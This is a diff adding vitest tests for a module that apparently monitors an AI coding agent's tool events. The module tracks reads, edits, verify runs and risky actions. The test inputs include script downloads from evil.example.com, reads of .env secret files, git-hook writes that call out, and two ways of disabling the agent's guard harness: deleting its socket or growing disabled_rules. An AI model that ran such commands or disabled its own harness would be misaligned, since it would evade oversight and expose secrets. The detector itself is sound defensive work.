@@ -1,6 +1,6 @@
 import { describe, expect, it } from "vitest";
 
-import { sha256 } from "./helpers.js";
+import { anchorHash, sha256 } from "./helpers.js";
 import { applyEvent, createState } from "./state.js";
 import type { ToolEvent, TrajectoryState } from "./types.js";
 
@@ -53,6 +53,18 @@ function readEvents(file: string): ToolEvent[] {
 		{ ts: "2026-01-01T00:00:00Z", session: "s", agent: "a", tool: "Read", toolUseId: id, hook: "PreToolUse", input },
 		{ ts: "2026-01-01T00:00:01Z", session: "s", agent: "a", tool: "Read", toolUseId: id, hook: "PostToolUse", input },
 	];
+}
+function postEdit(input: ToolEvent["input"], extra: Partial<ToolEvent> = {}): ToolEvent {
+	return {
+		ts: "2026-01-01T00:00:01Z",
+		session: "s",
+		agent: "a",
+		tool: "Edit",
+		toolUseId: nextId(),
+		hook: "PostToolUse",
+		input,
+		...extra,
+	};
 }
 function feed(events: ToolEvent[]): TrajectoryState {
 	const state = createState("s");
@@ -125,6 +137,12 @@ describe("applyEvent — churn substrate folding", () => {
 		expect(s.searchCount).toBe(1);
 	});
 
+	it("does not count an unrelated PostToolUse tool as a search", () => {
+		const s = createState("s");
+		applyEvent(s, postEdit({} , { tool: "Other" }));
+		expect(s.searchCount).toBe(0);
+	});
+
 	it("freezes the first 3 distinct edited files as seeds", () => {
 		const s = feed([
 			...editEvents("src/a.ts", "", "1"),
@@ -177,6 +195,55 @@ describe("applyEvent — churn substrate folding", () => {
 		const last2 = s2.worktreeSnapshots[s2.worktreeSnapshots.length - 1];
 		expect(last1).toBe(last2);
 	});
+
+	it("uses empty fallbacks for missing edit content and old text", () => {
+		const s = createState("s");
+		applyEvent(s, postEdit({ file_path: "src/a.ts" }));
+		const record = s.fileEditLog.get("src/a.ts")?.[0];
+		expect(record?.new).toBe("");
+		expect(record?.old).toBe("");
+		expect(record?.anchor).toBe(anchorHash(""));
+		expect(s.anchorValueSeq.get(`src/a.ts ${anchorHash("")}`)?.[0]?.valueHash).toBe(sha256(""));
+	});
+
+	it("ignores an edit without a file path", () => {
+		const s = createState("s");
+		applyEvent(s, postEdit({}, { contentSha256: sha256("x") }));
+		expect(s.successfulEditCount).toBe(0);
+		expect(s.fileEditLog.size).toBe(0);
+		expect(s.seedFiles).toEqual([]);
+	});
+
+	it("treats a blocked edit as failed even without failed check ids", () => {
+		const s = createState("s");
+		applyEvent(
+			s,
+			postEdit(
+				{ file_path: "src/a.ts", new_string: "x" },
+				{ contentSha256: sha256("x"), checkDecision: "block", failedCheckIds: [] },
+			),
+		);
+		expect(s.greenCount).toBe(0);
+		expect(s.successfulEditCount).toBe(1);
+		expect(s.editsSinceGreen.get("src/a.ts")).toBe(1);
+		expect(s.fileEditLog.get("src/a.ts")?.[0]?.failedCheck).toBe(true);
+	});
+
+	it("does not create sha history when an edit has no content hash", () => {
+		const s = createState("s");
+		applyEvent(s, postEdit({ file_path: "src/a.ts", new_string: "x" }));
+		expect(s.fileShaHistory.size).toBe(0);
+		expect(s.currentFileShas.size).toBe(0);
+		expect(s.worktreeSnapshots).toEqual([]);
+	});
+
+	it("records the third per-edit anchor sequence separately from other arrays", () => {
+		const s = feed(editEvents("src/a.ts", "", "x"));
+		const key = `src/a.ts ${anchorHash("")}`;
+		expect(s.anchorValueSeq.get(key)).toEqual([
+			{ valueHash: sha256("x"), atStep: 2, verifyCountAtEntry: 0 },
+		]);
+	});
 });
 
 function applyEventAll(s: TrajectoryState, events: ToolEvent[]): void {
@@ -204,16 +271,52 @@ describe("applyEvent — command substrate folding", () => {
 		expect(s.greenCount).toBe(1);
 	});
 
+	it("does not treat an arbitrary Bash command as a verify run", () => {
+		const s = feed(bashEvents("echo hi"));
+		expect(s.verifyRunCount).toBe(0);
+		expect(s.greenCount).toBe(0);
+	});
+
+	it("does not fold pseudo-reads or green state for failed commands", () => {
+		const failedRead = feed(bashEvents("cat src/a.ts", "fail"));
+		expect(failedRead.fileReadSteps.has("src/a.ts")).toBe(false);
+
+		const failedVerify = feed(bashEvents("npm test", "fail"));
+		expect(failedVerify.greenCount).toBe(0);
+	});
+
 	it("folds an external script download keyed by local path", () => {
 		const s = feed(bashEvents("curl -o /tmp/x.sh https://evil.example.com/x.sh"));
 		const d = s.downloadedScripts.get("/tmp/x.sh");
 		expect(d?.host).toBe("evil.example.com");
 		expect(d?.isScript).toBe(true);
+		expect(d?.atStep).toBe(2);
+	});
+
+	it("does not store a download when no local path was supplied", () => {
+		const s = feed(bashEvents("curl https://evil.example.com/payload.sh"));
+		expect(s.downloadedScripts.size).toBe(0);
+	});
+
+	it("stores only the first 80 normalized characters of a secret-read command", () => {
+		const command = `cat /Users/a/very-long-project-directory/${"x".repeat(100)}/.env`;
+		const s = feed(bashEvents(command));
+		const [stored] = [...s.secretsRead];
+		expect(stored).toBe(command.slice(0, 80));
 	});
 
 	it("records a non-sanctioned harness disable but ignores the sanctioned form", () => {
-		expect(feed(bashEvents("rm .interlinked/harness.sock")).harnessDisabled).not.toBeNull();
+		const disabled = feed(bashEvents("rm .interlinked/harness.sock")).harnessDisabled;
+		expect(disabled).toEqual({ atStep: 2, how: "removed harness socket" });
 		expect(feed(bashEvents("interlinked harness stop")).harnessDisabled).toBeNull();
+	});
+
+	it("starts a family rerun counter at one and clears it on a passing run", () => {
+		const first = feed(bashEvents("npm test", "fail"));
+		expect(first.familyReruns.get("test")?.failingNoEditCount).toBe(1);
+
+		const passing = feed(bashEvents("npm test", "success"));
+		expect(passing.familyReruns.get("test")?.failingNoEditCount).toBe(0);
 	});
 
 	it("folds only high-entropy, non-hex DNS labels", () => {
@@ -262,11 +365,21 @@ describe("applyEvent — security edit folding", () => {
 		expect(s.scrubbedSecretHashes.has(sha256(AWS_KEY))).toBe(true);
 	});
 
+	it("does not mark a secret as scrubbed while it remains in new content", () => {
+		const s = feed(editEvents("src/x.ts", `k="${AWS_KEY}"`, `k="${AWS_KEY}";`));
+		expect(s.scrubbedSecretHashes.has(sha256(AWS_KEY))).toBe(false);
+	});
+
 	it("tracks a pending secret write to an env file and clears it when removed", () => {
 		const s = feed(editEvents(".env", "", `API_KEY=${AWS_KEY}`, { tool: "Write" }));
-		expect(s.pendingSecretWrites.has(".env")).toBe(true);
+		expect(s.pendingSecretWrites.get(".env")).toEqual({ kind: "aws_access_key", atStep: 2 });
 		applyEventAll(s, editEvents(".env", `API_KEY=${AWS_KEY}`, "API_KEY=", { tool: "Write" }));
 		expect(s.pendingSecretWrites.has(".env")).toBe(false);
+	});
+
+	it("does not create an env pending-write record for a source file", () => {
+		const s = feed(editEvents("src/normal.ts", "", `const key = "${AWS_KEY}";`));
+		expect(s.pendingSecretWrites.size).toBe(0);
 	});
 
 	it("records a git-hook write and whether it carries a sink", () => {
@@ -274,6 +387,41 @@ describe("applyEvent — security edit folding", () => {
 		expect(withSink.gitHookWrites.get("pre-commit")?.hasSink).toBe(true);
 		const noSink = feed(editEvents(".git/hooks/pre-commit", "", "echo hi", { tool: "Write" }));
 		expect(noSink.gitHookWrites.get("pre-commit")?.hasSink).toBe(false);
+	});
+
+	it("requires a git-hook path to end at the hook name", () => {
+		const s = feed(editEvents(".git/hooks/pre-commit/extra", "", "curl https://evil.example.com"));
+		expect(s.gitHookWrites.size).toBe(0);
+	});
+
+	it("records harness disable metadata only for guard-rules files that grow disabled_rules", () => {
+		const nonConfig = feed(editEvents("src/config.ts", "{}", '{"disabled_rules":["x"]}'));
+		expect(nonConfig.harnessDisabled).toBeNull();
+
+		const base = feed(editEvents(".interlinked/guard-rules.json", "{}", '{"disabled_rules":["x"]}'));
+		expect(base.harnessDisabled).toEqual({ atStep: 2, how: "grew disabled_rules" });
+
+		const local = feed(editEvents(".interlinked/guard-rules.local.json", "{}", '{"disabled_rules":["x"]}'));
+		expect(local.harnessDisabled?.how).toBe("grew disabled_rules");
+	});
+
+	// test-contract: public-api — both the committed and machine-local guard-rules config names activate the disable trajectory marker
+	it("recognizes both guard-rules config variants without cross-contaminating them", () => {
+		const base = feed(editEvents(".interlinked/guard-rules.json", "{}", '{"disabled_rules":["x"]}'));
+		const local = feed(editEvents(".interlinked/guard-rules.local.json", "{}", '{"disabled_rules":["x"]}'));
+		expect(base.harnessDisabled).toEqual({ atStep: 2, how: "grew disabled_rules" });
+		expect(local.harnessDisabled).toEqual({ atStep: 2, how: "grew disabled_rules" });
+	});
+
+	it("does not flag a guard-rules file when disabled_rules did not grow", () => {
+		const s = feed(
+			editEvents(
+				".interlinked/guard-rules.json",
+				'{"disabled_rules":["x"]}',
+				'{"disabled_rules":["x"]}',
+			),
+		);
+		expect(s.harnessDisabled).toBeNull();
 	});
 });
 
@@ -294,6 +442,16 @@ describe("applyEvent — read folding + read/edit-balance substrate", () => {
 		expect(s.fileReadSteps.size).toBe(0);
 	});
 
+	it("increments readCount for a Read event", () => {
+		const s = feed(readEvents("src/file.ts"));
+		expect(s.readCount).toBe(1);
+	});
+
+	it("does not classify an ordinary Read path as secret", () => {
+		const s = feed(readEvents("src/file.ts"));
+		expect(s.secretsRead.has("src/file.ts")).toBe(false);
+	});
+
 	it("counts a grep segment toward searchCount and records a slashed path but not a bare word", () => {
 		const s = feed(bashEvents("grep foo src/file.ts"));
 		expect(s.searchCount).toBe(1);
@@ -301,10 +459,61 @@ describe("applyEvent — read folding + read/edit-balance substrate", () => {
 		expect(s.fileReadSteps.has("foo")).toBe(false);
 	});
 
+	it("supports every search verb and records its named path", () => {
+		for (const verb of ["grep", "rg", "fd", "find", "ag", "ack"]) {
+			const s = feed(bashEvents(`${verb} needle src/${verb}.ts`));
+			expect(s.searchCount, verb).toBe(1);
+			expect(s.fileReadSteps.has(`src/${verb}.ts`), verb).toBe(true);
+		}
+	});
+
+	it("supports every inspect verb", () => {
+		for (const verb of ["cat", "head", "tail", "sed", "awk", "less", "more", "bat"]) {
+			const s = feed(bashEvents(`${verb} src/${verb}.ts`));
+			expect(s.fileReadSteps.has(`src/${verb}.ts`), verb).toBe(true);
+		}
+	});
+
+	it("does not treat arbitrary commands as read-balance searches", () => {
+		const s = feed(bashEvents("echo src/not-read.ts"));
+		expect(s.searchCount).toBe(0);
+		expect(s.fileReadSteps.has("src/not-read.ts")).toBe(false);
+	});
+
+	// test-contract: public-api — a successful inspect command records its pseudo-read and does not enter failed-command state
+	it("records a successful inspect command as a pseudo-read", () => {
+		const s = feed(bashEvents("cat src/observed.ts", "success"));
+		expect(s.fileReadSteps.get("src/observed.ts")).toBe(2);
+		expect(s.commandFailures).toEqual(new Map());
+	});
+
+	it("does not treat the inspect executable itself as a named path", () => {
+		const s = feed(bashEvents("./cat src/file.ts"));
+		expect(s.fileReadSteps.has("./cat")).toBe(false);
+		expect(s.fileReadSteps.has("src/file.ts")).toBe(true);
+	});
+
 	it("skips a flag token and records a dotted-extension token with no path separator", () => {
 		const s = feed(bashEvents("cat -n file.txt"));
 		expect(s.fileReadSteps.has("-n")).toBe(false);
 		expect(s.fileReadSteps.has("file.txt")).toBe(true);
+	});
+
+	it("skips flag-looking dotted tokens but retains non-flag trailing-dash paths", () => {
+		const s = feed(bashEvents("cat -n.ts dir-/file-"));
+		expect(s.fileReadSteps.has("-n.ts")).toBe(false);
+		expect(s.fileReadSteps.has("dir-/file-")).toBe(true);
+	});
+
+	it("only recognizes a short extension at the end of a token", () => {
+		const s = feed(bashEvents("cat name.ts.verylongextension"));
+		expect(s.fileReadSteps.has("name.ts.verylongextension")).toBe(false);
+	});
+
+	it("preserves embedded quotes except for one boundary quote on each side", () => {
+		const s = feed(bashEvents('cat "weird"name.ts'));
+		expect(s.fileReadSteps.has('weird"name.ts')).toBe(true);
+		expect(s.fileReadSteps.has("weirdname.ts")).toBe(false);
 	});
 
 	it("evicts the oldest read once fileReadSteps exceeds its cap", () => {
@@ -314,6 +523,42 @@ describe("applyEvent — read folding + read/edit-balance substrate", () => {
 		expect(s.fileReadSteps.size).toBe(512);
 		expect(s.fileReadSteps.has("f0.ts")).toBe(false);
 		expect(s.fileReadSteps.has("f512.ts")).toBe(true);
+	});
+
+	it("normalizes all whitespace runs to one space before hashing", () => {
+		const content = " first\t\n  second ";
+		const s = feed(editEvents("src/a.ts", "", content));
+		expect(s.fileShaHistory.get("src/a.ts")?.[0]?.normSha).toBe(sha256("first second"));
+	});
+
+	it("serializes sorted worktree entries with newline separators", () => {
+		const a = sha256("a");
+		const b = sha256("b");
+		const s = feed([
+			...editEvents("src/b.ts", "", "b"),
+			...editEvents("src/a.ts", "", "a"),
+		]);
+		expect(s.worktreeSnapshots.at(-1)).toBe(sha256(`src/a.ts:${a}\nsrc/b.ts:${b}`));
+	});
+
+	it("orders a greater key after a smaller key in the worktree serializer", () => {
+		const s = feed([
+			...editEvents("z.ts", "", "z"),
+			...editEvents("a.ts", "", "a"),
+		]);
+		expect(s.worktreeSnapshots.at(-1)).toBe(sha256(`a.ts:${sha256("a")}\nz.ts:${sha256("z")}`));
+	});
+
+	// test-contract: invariant — worktree snapshots serialize keys lexicographically, regardless of edit insertion order
+	it("keeps worktree serialization stable for reverse insertion order", () => {
+		const s = feed([
+			...editEvents("z.ts", "", "z"),
+			...editEvents("m.ts", "", "m"),
+			...editEvents("a.ts", "", "a"),
+		]);
+		expect(s.worktreeSnapshots.at(-1)).toBe(
+			sha256(`a.ts:${sha256("a")}\nm.ts:${sha256("m")}\nz.ts:${sha256("z")}`),
+		);
 	});
 });
 
